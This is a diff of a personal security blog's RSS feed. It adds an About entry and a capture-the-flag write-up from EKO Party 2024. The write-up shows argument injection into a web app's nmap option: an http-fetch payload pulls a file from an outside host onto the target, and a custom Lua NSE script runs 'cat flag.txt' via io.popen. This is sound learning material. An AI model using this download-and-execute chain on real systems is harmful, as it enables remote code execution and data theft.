@@ -5,30 +5,134 @@
     <description>Recent content on Jstrah00 web / blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 18 Nov 2024 18:51:18 -0300</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.png</icon>
+    <lastBuildDate>Mon, 02 Dec 2024 17:33:00 -0300</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.png</icon>
     
     
     <item>
-      <title>First_post</title>
-      <link>http://localhost:1313/posts/first_post/</link>
-      <pubDate>Mon, 18 Nov 2024 18:51:18 -0300</pubDate>
+      <title>About</title>
+      <link>http://localhost:1313/about/</link>
+      <pubDate>Mon, 02 Dec 2024 17:33:00 -0300</pubDate>
       
-      <guid>http://localhost:1313/posts/first_post/</guid>
-      <description><![CDATA[<h1 id="mi-primer-post">Mi primer post!</h1>
-<h2 id="esto-es-un-subtitulo">esto es un subtitulo</h2>
-<p>Aca ponemos algo de texto</p>
-<h3 id="un-sub-sub-titulo">un sub sub titulo</h3>
-<p>Con algo de texto en <em>negrita</em></p>
-<h4 id="mas-chico-todavia">mas chico todavia</h4>
-<p><em>esto hace algo?</em></p>
-<p>Visit the <a href="https://gohugo.io">Hugo</a> website!</p>
-<h5 id="aun-mas">AUN MAS</h5>
-<p>This is <strong>bold</strong> text, and this is <em>emphasized</em> text.</p>
-<h6 id="byeee">byeee</h6>
-<pre tabindex="0"><code>func main() {
-    fmt.Println(&#34;Hello, 世界&#34;)
-}
-</code></pre>]]></description>
+      <guid>http://localhost:1313/about/</guid>
+      <description><![CDATA[<p>I&rsquo;m still not sure what to add here!</p>
+<p>My name is Julian. I work as a cyber security engineer in a startup.
+I&rsquo;m very passionate about offensive cyber security. I&rsquo;m currently studying for OSCP and CPTS.
+I&rsquo;m also a Python lover obsessed with automating everything.</p>
+<p>I use Arch btw (and Neovim).</p>
+]]></description>
+      
+    </item>
+    
+    
+    
+    <item>
+      <title>Kulkan Writeup - EKO Party CTF 2024</title>
+      <link>http://localhost:1313/posts/ekoparty_ctf_kulkan_writeup/</link>
+      <pubDate>Mon, 02 Dec 2024 17:11:00 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/ekoparty_ctf_kulkan_writeup/</guid>
+      <description><![CDATA[<p>Hi! I hope this finds you well on the other side of the screen :)
+TLDR; if you just want to focus on the write-up, you can skip the context section ;)</p>
+<h2 id="context">Context</h2>
+<p>This is my first write up, and also my first post on my site, so I would like to provide some context. My name is Julian, I work as a cybersecurity engineer at a payments startup. I have always enjoyed offensive cybersecurity and penetration testing, but never really focused on it until earlier this year. And as part of this journey, I also started playing CTFs.</p>
+<p>This month I had the opportunity to help at the Eko Party Cyber Security Conference in Buenos Aires, Argentina (where I live). It&rsquo;s the biggest cybersecurity conference in Latin America.
+The conference was amazing, there were a lot of great talks and the energy of the people there was amazing. I really enjoyed it.
+Like almost every cybersec conference, it had a CTF! So of course I signed up. I signed up as a team with my coworkers, but they couldn&rsquo;t make it to the conference, and since they were working while I was there, they didn&rsquo;t have a lot of time to participate in the CTF remotely.
+So since I was on my own and spent most of the day at the conference bouncing between amazing talks, I didn&rsquo;t have a lot of time to focus on the CTF. Anyway, I really enjoyed one of the challenges, so I thought it was a great excuse to write my first post. So here we are.</p>
+<p>As I said, I&rsquo;m just starting out on the &ldquo;offensive&rdquo; side of cybersecurity, so I&rsquo;m writing this as I&rsquo;d like to be explained if I were on the other side of the screen. Although I have no doubt that anyone reading it, regardless of their expertise, will find something useful here.</p>
+<h2 id="hands-on">Hands on</h2>
+<p>This is the challenge. We have a web application where our task is &ldquo;see if you can find a way to <strong>cat</strong> the flag&rdquo;. They give us a URL of an instancer that gives us 2 minutes to find the flag, but for testing and finding the vulnerability, they give us a zip with the source code.</p>
+<p><img src="/kulkan1.png" alt=""></p>
+<p>This is what the instancer looks like:</p>
+<p><img src="/kulkan2.png" alt=""></p>
+<p>The downloaded code has a python application and a docker file. So I build the docker image, run it, and when we access the provided URL we find a web application like this:</p>
+<p><img src="/kulkan3.png" alt=""></p>
+<p>It asks for a target (hostname/IP) and we can choose a command: ping, dig or nmap.</p>
+<p>So it&rsquo;s kind of obvious that we should try to find some kind of command injection here to cat the flag.</p>
+<p>I started with the &ldquo;ping&rdquo; and &ldquo;dig&rdquo; commands. I tried a bunch of different command injection payloads from <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">Hacktricks</a>, but none of them worked. I also tried some of these payloads with the nmap command, also with no result.</p>
+<p>At this point I started to think it wasn&rsquo;t the usual command injection, so I started reading documentation about the options and flags of these commands.</p>
+<p>Meanwhile, being a bit curious, I opened the python file running the server for the challenge and found that the code used the <code>shlex.split()</code> method to sanitize the command before executing it.
+After some research, I found out that this is a very safe way to execute commands through Python.
+I&rsquo;m a Python developer, so this ended up being useful to learn. And it also confirmed my theory that this was not a common command injection vulnerability.
+(Some may think it was cheating to see the code since it was supposed to be a black-box challenge, but in my defense, looking at the code only confirmed the theory I already had).</p>
+<p>Did some research on the options and flags for each command. Didn&rsquo;t find anything useful for <code>ping</code> and <code>dig</code>. When I started to do some research for the <code>nmap</code> command, I remembered the <code>--script</code> flag that allows us to run some custom scripts with nmap on the target host. So I thought maybe there was already a script that could help me.</p>
+<p>After reading the <a href="https://nmap.org/nsedoc/scripts/">Nmap Scripts Doc</a> I found that the <a href="https://nmap.org/nsedoc/scripts/http-fetch.html">http-fetch</a> script might be useful.
+This script allows us to retrieve files from servers.</p>
+<p>The first thing I did was try to use this script from the challenge web application.
+Since I was running it locally, I started a Python http server locally:</p>
+<p><img src="/kulkan4.png" alt=""></p>
+<p>and started ngrok:
+<code>ngrok http 127.0.0.1:9000</code>.</p>
+<p>And executed the <code>nmap</code> command with the payload:</p>
+<pre tabindex="0"><code>--script http-fetch --script-args http-fetch.url=test.txt,http-fetch.destination=/tmp/test e52d-181-164-0-217.ngrok-free.app 
+</code></pre><p>And it worked!</p>
+<p><img src="/kulkan5.png" alt=""></p>
+<p>But when I opened the downloaded file&hellip;</p>
+<p><img src="/kulkan6.png" alt=""></p>
+<p>It wasn&rsquo;t what I expected (&ldquo;this is a test file&rdquo;). Instead, it downloaded the ngrok warning page.
+So, looking for alternatives, I ended up hosting the file in a public repo on Github, and it worked as expected!</p>
+<p>Ok, so now we can upload files to the server&hellip; but what can we do with them?
+After some research, re-reading the [Nmap Scripts Doc] (<a href="https://nmap.org/nsedoc/scripts/)">https://nmap.org/nsedoc/scripts/)</a>, I didn&rsquo;t find anything useful&hellip;
+But after a while I had an idea&hellip; I can write my own Nmap NSE script to catch the flag!</p>
+<p>One important thing to know is whether it is possible to run nse scripts that are not stored in the nmap scripts folder. And yes, it is:</p>
+<p><img src="/kulkan7.png" alt=""></p>
+<p>So I started reading the <a href="https://nmap.org/book/nse-tutorial.html">Nmap script writing tutorial</a> and with that and a lot of help from ChatGPT I ended up with this NSE script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Define the description and category</span>
+</span></span><span style="display:flex;"><span>description <span style="color:#f92672">=</span> <span style="color:#e6db74">[[
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  This script reads the content of a file called &#39;flag.txt&#39; in the current directory.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">]]</span>
+</span></span><span style="display:flex;"><span>categories <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;discovery&#34;</span>, <span style="color:#e6db74">&#34;intrusive&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Import necessary libraries</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> stdnse <span style="color:#f92672">=</span> require(<span style="color:#e6db74">&#34;stdnse&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Define the rule function to specify when this script should run</span>
+</span></span><span style="display:flex;"><span>hostrule <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>  <span style="color:#75715e">-- Always run on specified target</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Define the main action function</span>
+</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host)
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Execute a command to read the file content</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> file <span style="color:#f92672">=</span> io.popen(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Error: Could not read file&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Read file content</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> content <span style="color:#f92672">=</span> file:read(<span style="color:#e6db74">&#34;*a&#34;</span>)
+</span></span><span style="display:flex;"><span>  file:close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> content <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;flag.txt content:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">..</span> content
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Error: No content found in flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>And hosted it in the Github repository I created earlier.</p>
+<p>So now we have everything ready, we just need to try it out.</p>
+<p>First, I downloaded the nse script into the target as we did before.</p>
+<p><img src="/kulkan8.png" alt=""></p>
+<p>In the scan result we can get the full location where it was downloaded. So with the full location of our nse script we can now run it:</p>
+<pre tabindex="0"><code>nmap www.google.com --script /tmp/flag-reader/185.199.111.133/443/jstrah00/expose-files/master/%2fjstrah00%2fexpose-files%2fmaster%2fflag-reader.nse
+</code></pre><p>(when running it in the web application, we omit the <code>nmap</code>)</p>
+<p>And it worked!</p>
+<p><img src="/kulkan9.png" alt=""></p>
+<p>So now we replicate this in the &ldquo;production environment&rdquo; and we have our flag :)</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This was a really fun challenge. In my opinion it is a bit hard to be classified as easy as it is.
+As a person just starting out in CTFs, it was the first time I had to build a &ldquo;custom&rdquo; script to solve one, and I really liked the challenge.
+I learned a lot from it, especially these key points:</p>
+<ul>
+<li>Using <code>shlex.split()</code> is a great way to safely execute commands in Python.</li>
+<li>Ngrok is not always the best way to expose files.</li>
+<li>Now I can write my own custom NSE scripts!</li>
+<li>Nmap is POWERFUL.</li>
+</ul>
+<p>So that was it! I hope you enjoyed reading this and learned something new.
+If you have any questions, comments, or anything else you want to discuss, feel free to contact me!</p>
+<p>Thanks for reading! Have a nice day!</p>
+]]></description>
       
     </item>
     
